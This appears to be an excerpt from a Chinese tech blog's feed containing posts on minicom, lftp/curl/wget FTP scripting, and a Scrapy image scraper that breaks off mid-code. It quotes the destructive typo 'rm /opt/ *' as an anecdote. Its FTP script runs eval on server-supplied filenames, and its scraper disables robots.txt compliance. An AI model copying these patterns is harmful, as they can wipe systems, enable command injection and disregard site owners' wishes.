<p>选好后回车，在返回菜单中选择<code>Save setup as dfl</code>，下次直接通过<code>sudo minicom</code>就可以使用了。 退出<code>minicom</code>使用快捷键<code>Ctrl A Z</code>然后按<code>x</code>即可。</p>
<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>最终发现不是固件的问题，而是测试人员操作失误，将<code>rm /opt/*</code> 写成了<code>rm /opt/ *</code>，没错就是多了个空格，把根目录能删的都删了，至于怎么发现的，根据测试提供的<code>console log</code>。。。</p>
<p>虽然这个传输后的<code>fw.img</code>没有派上用场，但学到了一个可以特定情况下很有用的冷知识也是很不错的，关键时候挺管用的。不过这个方法也有其局限性，就是如果在cat过程中，板子自动打印了许多其它类型的<code>log</code>，就会把数据搞乱。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> tftp </tag>
            
            <tag> nand </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用正则模糊匹配的ftp文件传输]]></title>
      <url>https://www.litreily.top/2019/09/02/lftp/</url>
      <content type="html"><![CDATA[<p>通常而言，FTP传输过程中，客户端在完成账户认证后，需要指定具体的文件路径方能下载或删除服务器端的文件。但是在使用命令行指令去操作ftp数据时，如果每次都要输入完整的路径就太麻烦了，而且如果想要同时下载多个文件还需逐个执行下载指令，那有什么方法可以通过<strong>正则表达式</strong>去完成模糊匹配和批量下载呢？本文就来介绍一下FTP数据传输的常用操作及正则匹配的实现方法。</p>
<p><img src="/assets/ftp/ftp.png" alt="ftp diagram"></p>
<a id="more"></a>
<h2 id="常用的ftp客户端"><a href="#常用的ftp客户端" class="headerlink" title="常用的ftp客户端"></a>常用的ftp客户端</h2><p>在介绍ftp数据传输之前，简单介绍下常用的几款ftp client：</p>
<ul>
<li><code>ftp</code></li>
<li><code>lftp</code>（支持ftp, http, https, sftp, fish, torrent, fxp, ...）</li>
<li><code>sftp</code>(Secure File Transfer Protocol)</li>
<li>FileZilla(图形化软件，支持ftp, ftps, sftp)</li>
</ul>
<p><code>ftp</code>是最基本的ftp客户端，高效但不安全，数据传输过程中使用明文，容易被截获和篡改。<code>lftp</code>是非常强大的一款文件传输工具，支持多种文件传输协议，功能强大，支持递归镜像整个目录及断点续传等，也是本文采用的ftp客户端。<code>sftp</code>是<code>ssh</code>的一部分，支持加密传输，与<code>ftp</code>语法基本一致，非常安全但是传输效率较低。最后的<code>FileZilla</code>是一款图形化软件，在windows操作系统中使用较多。</p>
<h2 id="ftp常用操作"><a href="#ftp常用操作" class="headerlink" title="ftp常用操作"></a>ftp常用操作</h2><p>本文主要介绍以下四个常用的ftp操作</p>
<ul>
<li>账户认证</li>
<li>文件上传</li>
<li>文件下载（用到正则模糊匹配）</li>
<li>文件删除</li>
</ul>
<p><code>lftp</code>指令的语法如下：</p>
<pre><code class="bash">lftp [-d] [-e cmd] [-p port] [-u user[,pass]] [site]
lftp -f script_file
lftp -c commands
lftp --version
lftp --help
</code></pre>
<p><code>lftp</code>的帮助信息中可以看到所有可以执行的指令。</p>
<pre><code class="bash">$ lftp -u &quot;username,password&quot; ftp://host.ip
lftp username@host:~&gt; help
    !&lt;shell-command&gt;                     (commands)
    alias [&lt;name&gt; [&lt;value&gt;]]             attach [PID]
    bookmark [SUBCMD]                    cache [SUBCMD]
    cat [-b] &lt;files&gt;                     cd &lt;rdir&gt;
    chmod [OPTS] mode file...            close [-a]
    [re]cls [opts] [path/][pattern]      debug [OPTS] [&lt;level&gt;|off]
    du [options] &lt;dirs&gt;                  edit [OPTS] &lt;file&gt;
    exit [&lt;code&gt;|bg]                     get [OPTS] &lt;rfile&gt; [-o &lt;lfile&gt;]
    glob [OPTS] &lt;cmd&gt; &lt;args&gt;             help [&lt;cmd&gt;]
    history -w file|-r file|-c|-l [cnt]  jobs [-v] [&lt;job_no...&gt;]
    kill all|&lt;job_no&gt;                    lcd &lt;ldir&gt;
    lftp [OPTS] &lt;site&gt;                   ln [-s] &lt;file1&gt; &lt;file2&gt;
    ls [&lt;args&gt;]                          mget [OPTS] &lt;files&gt;
    mirror [OPTS] [remote [local]]       mkdir [OPTS] &lt;dirs&gt;
    module name [args]                   more &lt;files&gt;
    mput [OPTS] &lt;files&gt;                  mrm &lt;files&gt;
    mv &lt;file1&gt; &lt;file2&gt;                   mmv [OPTS] &lt;files&gt; &lt;target-dir&gt;
    [re]nlist [&lt;args&gt;]                   open [OPTS] &lt;site&gt;
    pget [OPTS] &lt;rfile&gt; [-o &lt;lfile&gt;]     put [OPTS] &lt;lfile&gt; [-o &lt;rfile&gt;]
    pwd [-p]                             queue [OPTS] [&lt;cmd&gt;]
    quote &lt;cmd&gt;                          repeat [OPTS] [delay] [command]
    rm [-r] [-f] &lt;files&gt;                 rmdir [-f] &lt;dirs&gt;
    scache [&lt;session_no&gt;]                set [OPT] [&lt;var&gt; [&lt;val&gt;]]
    site &lt;site-cmd&gt;                      source &lt;file&gt;
    torrent [OPTS] &lt;file|URL&gt;...         user &lt;user|URL&gt; [&lt;pass&gt;]
    wait [&lt;jobno&gt;]                       zcat &lt;files&gt;
    zmore &lt;files&gt;
lftp username@host:~&gt;
</code></pre>
<h2 id="账户认证"><a href="#账户认证" class="headerlink" title="账户认证"></a>账户认证</h2><p>基于安全考虑，绝大多数的ftp server都会设置账户密码，那么使用<code>lftp</code>该如何完成认证呢？其中在上面的示例中已经给出答案了，就是通过参数<code>-u</code>指定。</p>
<pre><code class="bash">lftp -u &quot;$ftp_user,$ftp_pass&quot;
</code></pre>
<p>如果将密码存储在某个文件<code>~/local/etc/ftp_pass</code>，那么可以在脚本中使用一个函数进行获取。</p>
<pre><code class="bash"> get_ftp_pass()
 {
     pass_file=$HOME/local/etc/ftp_pass
     [ -f $pass_file ] &amp;&amp; ftp_pass=$(cat $pass_file)
     test -z &quot;$ftp_pass&quot; \
         &amp;&amp; read -rs -p &quot;Please input password of your FTP user $ftp_user: &quot; ftp_pass
 }
</code></pre>
<h2 id="通用操作"><a href="#通用操作" class="headerlink" title="通用操作"></a>通用操作</h2><p>如果完全使用<code>lftp</code>完成ftp传输的各个功能，那么可以在<code>shell</code>脚本中使用以下模板完成各个指令操作：</p>
<pre><code class="bash">lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
    COMMAND1 [Args1]
    COMMAND2 [Args2]
EOF
</code></pre>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>由于文件上传是将本地文件传输至ftp server，那么通常情况不需要正则匹配，本地文件选择通过shell的tab自动补全即可做到。</p>
<p>使用<code>lftp</code>的<code>put $file -o $remotefile</code>可将本地文件<code>$file</code>传输至ftp server并重命名为<code>$remotefile</code>，<code>-o</code>参数用于指定server端的文件名。</p>
<pre><code class="bash">ftp_put_file()
{
    get_ftp_pass

    prefix=$(date &#39;+%Y%m%d%H%M%S-&#39;)
    remotefile=${prefix}${file##*/}
    subdir=$(date &#39;+%Y%m%d&#39;)

    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
             mkdir -p -f $subdir
         cd $subdir &amp;&amp; put ${file##*/} -o ${remotefile}
     EOF
}
</code></pre>
<p>如上代码所示，当我们想要<strong>将文件传输至服务端子目录</strong>时，需要通过<code>mkdir</code>和<code>cd</code>指令完成目录的创建和切换。在本例中，我们将每次上传的文件都放置在了以当天日期命名所在的文件夹，并给原有文件名加上了时间戳前缀。</p>
<p>此处需要普及两个知识点：</p>
<ul>
<li>shell中的变量切割</li>
</ul>
<blockquote>
<p><strong>变量切割</strong></p>
<p><code>#</code> 删除变量左侧的最短匹配；<code>##</code> 删除变量左侧的最长匹配</p>
<p><code>%</code> 删除变量右侧的最短匹配；<code>%%</code>删除变量右侧的最长匹配</p>
<p>${file##*/} 以<code>/</code>为分隔符，删除最后一个<code>/</code>往左的所有字符，此处用于获取文件名</p>
<p>${file%/*} 以<code>/</code>为分隔符，删除最后一个<code>/</code>往右的所有字符，此处用于获取目录</p>
</blockquote>
<p>我们通常在脚本中使用<code>${0##*/}</code>获取当前执行指令的文件名。</p>
<ul>
<li><code>&lt;&lt;-EOF</code>语法</li>
</ul>
<pre><code class="bash">**man bash**

[n]&lt;&lt;[-]word
        here-document
delimiter

......

If the redirection operator is `&lt;&lt;-`, then all leading tab characters are stripped from input lines and the line  containing  delimiter.   This  allows  here-documents within shell scripts to be indented in a natural fashion.
</code></pre>
<p>简单点说，<code>&lt;&lt;-EOF</code>中的连接符<code>-</code>保证下面语句中的每行开头的<code>tab</code>分隔符会被忽略，但又可以保证代码的自然美观。如果下面语句中开头的<code>tab</code>键是空格替换的，那么有可能会报语法错误，这也是需要注意的。</p>
<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>文件下载是本文重点，因为我们将完成ftp服务器端文件的模糊匹配下载。在讲述模糊匹配下载之前，先讲讲使用<code>lftp</code>实现下载的方法。</p>
<pre><code class="bash">ftp_get_file()
{
    get_ftp_pass

    if test &quot;${file%/*}&quot; = &quot;${file}&quot;; then
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            set xfer:clobber on
            get ${file}
        EOF
    else
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            set xfer:clobber on
            cd ${file%/*} &amp;&amp; get ${file##*/}
        EOF
    fi
}
</code></pre>
<p>以上实现中，分带有子目录和不带子目录两种情况，指令<code>set xfer:clobber on</code>是为了解决重复下载时提示文件已存在的问题。这种方法简单，但是每次只能下载一个确切名称的文件。</p>
<p>好了，接下来介绍能够实现模糊匹配及批量下载的方法，思路其实很简单：</p>
<ol>
<li>从给定的文件路径中解析出<strong>目录</strong>以及符合正则表达式的<strong>文件名</strong></li>
<li>使用<code>curl</code>指令下载指定<code>ftp</code>目录，得到指定目录的<strong>文件列表信息</strong></li>
<li>对列表信息使用<code>awk</code>, <code>grep</code>指令完成正则模糊匹配，获取真实文件路径</li>
<li>使用<code>wget</code>指令批量下载匹配到的文件</li>
</ol>
<p>根据这个思路编写代码如下：</p>
<pre><code class="bash">ftp_get_file()
{
    get_ftp_pass

    # get subdir and regex pattern of filenames
    result=$(echo &quot;$file&quot; |grep &quot;/&quot;)
    if [ &quot;x$result&quot; != &quot;x&quot; ]; then
        # split file to directory and re pattern of files
        subdir=${file%/*}/
        re_pattern=${file##*/}
    else
        subdir=&quot;/&quot;
        re_pattern=$file
    fi

    # 1. curl get file list
    files=$(curl -s -u ${ftp_user}:${ftp_pass} ${ftp_host}/${subdir})
    [ $? -eq 67 ] &amp;&amp; echo &quot;curl: password error!&quot; &amp;&amp; exit 2

    # 2. grep with regex to get files which need download
    files=$(echo &quot;$files&quot; |awk &#39;{print $4}&#39; |grep &quot;${re_pattern}&quot;)
    [ &quot;x$files&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;Not Found Files&quot; &amp;&amp; exit 3

    file_nums=$(echo &quot;$files&quot; |wc -l)
    [ ! $file_nums -eq 1 ] &amp;&amp; {
        files=$(echo &quot;$files&quot; |xargs)
        files=&quot;{${files//\ /,}}&quot;
    }

    # 3. wget files
    eval wget --ftp-user=${ftp_user} --ftp-password=${ftp_pass} ${ftp_host}/${subdir}${files} -nv
}
</code></pre>
<p>首先从带有模糊匹配的文件名中分隔出远程目录及文件名的正则表达式，然后根据预定的思路逐步完成文件匹配及下载。这里需要注意的几个问题有：</p>
<ol>
<li><code>curl</code>及<code>wget</code>有各自的认证参数：<ul>
<li><code>curl -u %{ftp_user}:${ftp_pass}</code></li>
<li><code>wget --ftp-user=${ftp_user} --ftp_password=${ftp_pass}</code></li>
</ul>
</li>
<li>当只匹配到一个文件时，文件名不能使用<code>{}</code>包含在一起，所以代码中使用了<code>wc -l</code>统计匹配到的文件数</li>
<li>对于包含换行符的变量<code>$files</code>，在用<code>echo</code>打印时需加上双引号<code>&quot;$files&quot;</code>，否则换行符会自动变为空格</li>
<li>shell中的变量可以进行字符替换，<code>${files//\ /,}</code>就是将<code>$files</code>变量中的所有空格替换成了逗号<ul>
<li><code>//</code>替换所有匹配项</li>
<li><code>/</code>仅仅替换第一个匹配项</li>
</ul>
</li>
</ol>
<h2 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h2><p>对于文件删除，由于使用较少，所以没有对其实现模糊匹配，当然想要实现也是可以的。这里仅给出最基本的删除方式：</p>
<pre><code class="bash">ftp_del_file()
{
    get_ftp_pass

    if test &quot;${file%/*}&quot; = &quot;${file}&quot;; then
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            rm -rf ${file}
        EOF
    else
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            cd ${file%/*} &amp;&amp; rm -rf ${file##*/}
        EOF
    fi
}
</code></pre>
<p>到此，常见的ftp操作都已经介绍完了。</p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>完整代码<code>fctl</code>如下：</p>
<pre><code class="bash">#!/bin/bash

cmd=&quot;${0##*/}&quot;

ftp_host=&quot;ftp://127.0.0.1&quot;

test -z &quot;$ftp_user&quot; &amp;&amp; ftp_user=&quot;${USER}&quot;

#usage()
#{
#  cat &lt;&lt;-EOF &gt;&amp;2
#  Usage: fput &lt;file&gt;
#         fget &lt;file/dir&gt;
#         fdel &lt;file/dir&gt;
#  EOF
#}

get_ftp_pass()
{
    pass_file=$HOME/local/etc/ftp_pass
    [ -f $pass_file ] &amp;&amp; ftp_pass=$(cat $pass_file)

    test -z &quot;$ftp_pass&quot; \
        &amp;&amp; read -rs -p &quot;Please input password of your FTP user $ftp_user: &quot; ftp_pass
}

ftp_put_file()
{
    get_ftp_pass

    prefix=$(date &#39;+%Y%m%d%H%M%S-&#39;)
    remotefile=${prefix}${file##*/}
    subdir=$(date &#39;+%Y%m%d&#39;)

    if test -z &quot;$subdir&quot;; then
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            put ${file##*/} -o ${remotefile}
        EOF
    else
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            mkdir -p -f $subdir
            cd $subdir &amp;&amp; put ${file##*/} -o ${remotefile}
        EOF
    fi
}

ftp_get_file()
{
    get_ftp_pass

    result=$(echo &quot;$file&quot; |grep &quot;/&quot;)
    if [ &quot;x$result&quot; != &quot;x&quot; ]; then
        # split file to directory and re pattern of files
        subdir=${file%/*}/
        re_pattern=${file##*/}
    else
        subdir=&quot;/&quot;
        re_pattern=$file
    fi

    # 1. curl get file list
    files=$(curl -s -u ${ftp_user}:${ftp_pass} ${ftp_host}/${subdir})
    [ $? -eq 67 ] &amp;&amp; echo &quot;curl: password error!&quot; &amp;&amp; exit 2

    # 2. grep with regex to get files which need download
    files=$(echo &quot;$files&quot; |awk &#39;{print $4}&#39; |grep &quot;${re_pattern}&quot;)
    [ &quot;x$files&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;Not Found Files&quot; &amp;&amp; exit 3

    file_nums=$(echo &quot;$files&quot; |wc -l)
    [ ! $file_nums -eq 1 ] &amp;&amp; {
        files=$(echo &quot;$files&quot; |xargs)
        files=&quot;{${files//\ /,}}&quot;
    }

    # 3. wget files
    eval wget --ftp-user=${ftp_user} --ftp-password=${ftp_pass} ${ftp_host}/${subdir}${files} -nv
}

ftp_del_file()
{
    get_ftp_pass

    if test &quot;${file%/*}&quot; = &quot;${file}&quot;; then
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            rm -rf ${file}
        EOF
    else
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            cd ${file%/*} &amp;&amp; rm -rf ${file##*/}
        EOF
    fi
}

case &quot;$cmd&quot; in
    &quot;fput&quot;)
        file=&quot;${1:?missing arg 1 to specify file path!!!}&quot;
        cd &quot;$(dirname $(readlink -f $file))&quot; &amp;&amp; ftp_put_file ;;
    &quot;fget&quot;)
        file=&quot;${1:?missing arg 1 to specify file path!!!}&quot;
        ftp_get_file ;;
    &quot;fdel&quot;)
        file=&quot;${1:?missing arg 1 to specify file path!!!}&quot;
        ftp_del_file ;;
esac
</code></pre>
<h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><p>使用<code>ln -s</code>创建<code>fput</code>,<code>fget</code>,<code>fdel</code>三个软链接，便可通过这三个别名完成对应的上传、下载和删除操作了。</p>
<ul>
<li>fput</li>
</ul>
<pre><code class="bash">fput test # test文件将存放至server当天目录，并冠以时间戳为文件名前缀
fput ~/bin/fget  # fget文件将存放至server当天目录，并冠以时间戳为文件名前缀
</code></pre>
<ul>
<li>fget</li>
</ul>
<pre><code class="bash">fget 20190902/ # 获取服务器端20190902目录下所有文件
fget 20190902/2019 # 获取服务器端20190902目录下包含2019字符的所有文件
fget test # 获取服务器端根目录下包含test子串的所有文件
fget te.*st # 获取服务器端根目录下符合匹配符的所有文件，如test,teast,teost,teeest
</code></pre>
<ul>
<li>fdel</li>
</ul>
<pre><code class="bash">fdel test # 删除服务器端根目录名为test的文件
fdel docs/test # 删除服务器端docs目录下名为test的文件
</code></pre>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://man.linuxde.net/lftp" target="_blank" rel="noopener">lftp命令</a></li>
<li><a href="https://www.cnblogs.com/gx-303841541/archive/2012/10/25/2738048.html" target="_blank" rel="noopener">shell 字符串分割与连接</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> ftp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python网络爬虫6 - Scrapy爬取vmgirls]]></title>
      <url>https://www.litreily.top/2019/08/09/vmgirls/</url>
      <content type="html"><![CDATA[<p>今天介绍一个妹子站点图片的爬取过程，站点<a href="https://www.vmgirls.com/" target="_blank" rel="noopener">唯美女生</a>。站点结构非常简单，单独用<code>requests</code>库或者<code>scrapy</code>框架都可以。本文介绍的是使用<code>scrapy</code>框架爬取。</p>
<p><img src="/assets/vmgirls/vmgirls.png" alt="vmgirls"></p>
<a id="more"></a>
<h2 id="分析vmgirls站点"><a href="#分析vmgirls站点" class="headerlink" title="分析vmgirls站点"></a>分析vmgirls站点</h2><p>站点做的非常清新唯美，结构简洁明了，主页的主体部分以卡片形式展示各个主题的缩略图和简要介绍，但主页并不适合直接爬取。</p>
<p><img src="/assets/vmgirls/home.png" alt="vmgirls home page"></p>
<p>不过幸好该站点已经提供了站点地图，对于这种相对简单的网站，使用现成的网站地图简直事半功倍。</p>
<p><img src="/assets/vmgirls/sitemap.png" alt="sitemap"></p>
<p>那么思路就很清楚了，首先通过站点地图获取所有主题页面的网址和标题，然后逐个爬取妹子页面，提取所有的图片<code>url</code>，然后下载到本地，每个主题页面的图片单独存放到一个文件夹中。</p>
<h3 id="站点地图"><a href="#站点地图" class="headerlink" title="站点地图"></a>站点地图</h3><p>本站点提供了两个站点地图：</p>
<ol>
<li><a href="https://www.vmgirls.com/sitemap.shtml" target="_blank" rel="noopener">https://www.vmgirls.com/sitemap.shtml</a></li>
<li><a href="https://www.vmgirls.com/sitemap.xml" target="_blank" rel="noopener">https://www.vmgirls.com/sitemap.xml</a></li>
</ol>
<p>第1个是面向用户的站点地图，从主页的导航栏就能找到；第2个（如下图）则是常规网站留给搜索引擎的站点地图，文件格式也是常规的<code>xml</code></p>
<p><img src="/assets/vmgirls/sitemap_xml.png" alt="sitemap.xml"></p>
<p>我使用<code>wget</code>指令获取两个文件，并进行了对比，发现<code>sitemap.xml</code>仅仅包含1000个网址，但是可视的站点地图包含1163个网址。说明留给搜索引擎的地图并不完整，而且相比较之下，<code>sitemap.shtml</code>所占的文件大小要比<code>sitemap.xml</code>还要小，这是因为<code>sitemap.xml</code>因其格式问题，带有大量重复信息。</p>
<pre><code class="bash">➜  tmp ls -lh
total 320K
-rw-r--r-- 1 litreily litreily 132K 8月  26 17:25 sitemap.shtml
-rw-r--r-- 1 litreily litreily 186K 8月  26 20:44 sitemap.xml
</code></pre>
<p>所以，不管是考虑完整性，还是文件大小，我们都有理由选择<code>sitemap.shtml</code>作为爬取的第一个网页。</p>
<p>下面来看看站点地图的html结构：</p>
<p><img src="/assets/vmgirls/sitemap_struct.png" alt="sitemap structure"></p>
<p>使用<code>wget</code>获取该网页，截取其中一段列表信息如下：</p>
<pre><code class="html">&lt;h2 style=&quot;text-align: center; margin-top: 20px&quot;&gt;唯美女生站点地图&lt;/h2&gt;
&lt;center&gt;&lt;/center&gt;
&lt;div id=&quot;nav&quot;&gt;
&lt;a href=&quot;https://www.vmgirls.com/&quot;&gt;&lt;strong&gt;唯美女生&lt;/strong&gt;&lt;/a&gt; » &lt;a href=&quot;https://www.vmgirls.com/sitemap.shtml&quot;&gt;站点地图&lt;/a&gt;
&lt;/div&gt;
&lt;div id=&quot;content&quot;&gt;
&lt;h3&gt;最新文章&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12530.html&quot; title=&quot;倦怠&quot; target=&quot;_blank&quot;&gt;倦怠&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12517.html&quot; title=&quot;逆光&quot; target=&quot;_blank&quot;&gt;逆光&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12507.html&quot; title=&quot;回眸&quot; target=&quot;_blank&quot;&gt;回眸&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12487.html&quot; title=&quot;早安，乖乖&quot; target=&quot;_blank&quot;&gt;早安，乖乖&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12477.html&quot; title=&quot;你眼里有我&quot; target=&quot;_blank&quot;&gt;你眼里有我&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12476.html&quot; title=&quot;夏日限定&quot; target=&quot;_blank&quot;&gt;夏日限定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12419.html&quot; title=&quot;你眼睛一闪一闪的&quot; target=&quot;_blank&quot;&gt;你眼睛一闪一闪的&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12405.html&quot; title=&quot;夏天你的甜&quot; target=&quot;_blank&quot;&gt;夏天你的甜&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12386.html&quot; title=&quot;无尽夏&quot; target=&quot;_blank&quot;&gt;无尽夏&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12353.html&quot; title=&quot;Halcyon&quot; target=&quot;_blank&quot;&gt;Halcyon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12333.html&quot; title=&quot;少女情怀&quot; target=&quot;_blank&quot;&gt;少女情怀&lt;/a&gt;&lt;/li&gt;
</code></pre>
<p>从上图可以看出，网页网址以<code>&lt;li&gt;</code>列表形式存储，网页解析时使用以下xpath表达式即可获取到所有的网址和标题。</p>
<pre><code class="python"># example:
# &lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12419.html&quot; title=&quot;你眼睛一闪一闪的&quot; target=&quot;_blank&quot;&gt;你眼睛一闪一闪的&lt;/a&gt;&lt;/li&gt;
urls = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/@href&#39;).extract()
titles = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/text()&#39;).extract()
</code></pre>
<p>据此，我们便拿到了所有页面的网址和标题，下面针对单个主题页面进行解析。</p>
<h3 id="单个主题页面"><a href="#单个主题页面" class="headerlink" title="单个主题页面"></a>单个主题页面</h3><p><img src="/assets/vmgirls/theme.png" alt="single theme"></p>
<p>针对单个主题页面，使用<code>Chrome</code>调试工具可以看到图片链接的<code>DOM</code>结构，但是要注意的是，调试工具看到的和实际wget获取到的不太一样，我猜测是在浏览器上显示时执行了某些额外的JS脚本。不管怎么样，当然是要以爬取后的实际数据为准，如下信息所示，img标签的<code>src</code>属性与上图中的不一样，所以我们在解析时不能使用这个属性，但是<code>data-src</code>则是相同的。</p>
<pre><code class="html">&lt;div class=&quot;post-content&quot;&gt;
&lt;div class=&quot;nc-light-gallery&quot;&gt;
&lt;p&gt;◎摄影/后期：@萌琦琦M77&lt;br&gt; – – – – – – – –&lt;br&gt; 你的眼睛里好像有闪闪的星星坠落。&lt;br&gt;
&lt;a href=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-53-58.jpg&quot; alt=&quot;你眼睛一闪一闪的&quot; title=&quot;你眼睛一闪一闪的&quot;&gt;&lt;img alt=&quot;你眼睛一闪一闪的-唯美女生&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&quot; data-src=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-53-58.jpg&quot; data-nclazyload=&quot;true&quot;&gt;&lt;/a&gt;
&lt;a href=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-54-01.jpg&quot; alt=&quot;你眼睛一闪一闪的&quot; title=&quot;你眼睛一闪一闪的&quot;&gt;&lt;img alt=&quot;你眼睛一闪一闪的-唯美女生&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&quot; data-src=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-54-01.jpg&quot; data-nclazyload=&quot;true&quot;&gt;&lt;/a&gt;
</code></pre>
<p>由上面的分析可以确定出以下解析方式，以获取到当前页面所有图片的下载链接。</p>
<pre><code class="python">urls = response.xpath(&#39;//*[@class=&quot;post-content&quot;]//img/@data-src&#39;).extract()
</code></pre>
<p>至此，单个页面的解析思路也清楚了，之后通过<code>Scrapy</code>的<code>ImagesPipeline</code>即可完成图片下载。</p>
<h2 id="爬虫的代码实现"><a href="#爬虫的代码实现" class="headerlink" title="爬虫的代码实现"></a>爬虫的代码实现</h2><h3 id="创建scrapy项目"><a href="#创建scrapy项目" class="headerlink" title="创建scrapy项目"></a>创建scrapy项目</h3><pre><code class="bash">$ scrapy startproject vmgirls
$ cd vmgirls
$ scrapy genspider vmgirl www.vmgirls.com
$ tree
.
├── scrapy.cfg
└── vmgirl
    ├── __init__.py
    ├── items.py
    ├── middlewares.py
    ├── pipelines.py
    ├── settings.py
    └── spiders
        ├── __init__.py
        └── vmgirl.py
</code></pre>
<h3 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h3><p>编辑settings.py</p>
<pre><code class="python">BOT_NAME = &#39;vmgirls&#39;

SPIDER_MODULES = [&#39;vmgirls.spiders&#39;]
NEWSPIDER_MODULE = &#39;vmgirls.spiders&#39;

import os
USER_DIR = os.path.expanduser(&#39;~&#39;)
USER_DATA_DIR = os.path.join(USER_DIR, &#39;Pictures/python/vmgirls&#39;)
IMAGES_STORE = USER_DATA_DIR

# Obey robots.txt rules
ROBOTSTXT_OBEY = False

# Configure item pipelines
# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html
ITEM_PIPELINES = {
    &#39;vmgirls.pipelines.VmgirlsPipeline&#39;: 300,
    &#39;vmgirls.pipelines.VmgirlsImagesPipeline&#39;: 400
}
</code></pre>
<p>如上代码所示，全局配置文件主要定义了文件存储路径<code>IMAGES_STORE</code>, 禁止遵守robots.txt, 启用两个Pipeline并设置其优先级。</p>
<h3 id="定义Item"><a href="#定义Item" class="headerlink" title="定义Item"></a>定义Item</h3><p>接下来定义两个Item类，<code>VmgirlsItem</code>用于存储主题页面的网址及其标题，<code>VmgirlsImagesItem</code>用于存储单个主题页面内所有图片的地址和主题的标题。这两个类的title内容是一致的。</p>
<pre><code class="python">from scrapy.item import Item
from scrapy.item import Field


class VmgirlsItem(Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    url = Field()
    title = Field()
    pass

class VmgirlsImagesItem(Item):
    image_urls = Field()
    title = Field()
    pass
</code></pre>
<h3 id="编写爬虫"><a href="#编写爬虫" class="headerlink" title="编写爬虫"></a>编写爬虫</h3><p>爬虫当然是最关键的一步，爬取思路与开始提及的站点分析思路一致，先爬取站点地图，然后在解析函数<code>parse</code>中获取所有主题页面的网址和标题，并通过<code>VmgirlsItem</code>提交到项目管道；与此同时，将爬取到的主题页面提交给引擎，由引擎把需求转给调度器和下载器；这一步爬取的结果由新的解析函数<code>parse_page</code>处理。</p>
<p>解析函数<code>parse_page</code>会将每个主题页面的图片链接和标题提取出来，然后提交给项目管道，由pipeline部分完成图片下载操作。</p>
<pre><code class="python">import scrapy

from vmgirls.items import VmgirlsItem
from vmgirls.items import VmgirlsImagesItem

from scrapy.http import Request
from scrapy.utils.project import get_project_settings

import os

class VmgirlSpider(scrapy.Spider):
    name = &#39;vmgirl&#39;
    allowed_domains = [&#39;vmgirls.com&#39;]
    start_urls = [&#39;https://www.vmgirls.com/sitemap.shtml/&#39;]

    def __init__(self):
        settings = get_project_settings()
        self.user_data_dir = settings.get(&#39;USER_DATA_DIR&#39;)

    def parse(self, response):
        &#39;&#39;&#39;Parse sitemap&#39;&#39;&#39;
